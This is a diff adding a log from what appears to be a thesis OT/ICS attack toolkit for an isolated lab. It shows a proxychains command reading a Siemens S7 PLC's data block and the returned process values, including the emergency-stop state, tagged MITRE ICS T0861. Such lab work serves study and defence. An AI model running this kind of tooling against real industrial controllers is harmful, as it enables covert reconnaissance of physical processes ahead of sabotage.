@@ -1,0 +1,25 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  Siemens S7 - Lectura de variables (DB1)
+======================================================================
+  Fecha      : 2026-10-09 22:34:48
+  Objetivo   : 192.168.30.10 rack=0 slot=1
+  MITRE ICS  : T0861
+======================================================================
+$ proxychains python3 -m modules._cli.s7_cli read_db1 --target 192.168.30.10 --rack 0 --slot 1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.30.10:102  ...  OK
+[+] Conectado correctamente al PLC S7 en 192.168.30.10
+==========================================
+          LECTURA DE VARIABLES (DB1)      
+==========================================
+  [*] Temperatura (DB1.DBW0): 25 ºC
+  [*] Presión     (DB1.DBW2): 10 bar
+  [*] Marcha      (DB1.DBX4.0): False
+  [*] Parada Emerg(DB1.DBX4.1): False
+  [*] Setpoint    (DB1.DBD6): 50.00 Hz
+==========================================
+[+] Conexión cerrada.
+[=] Código de salida: 0
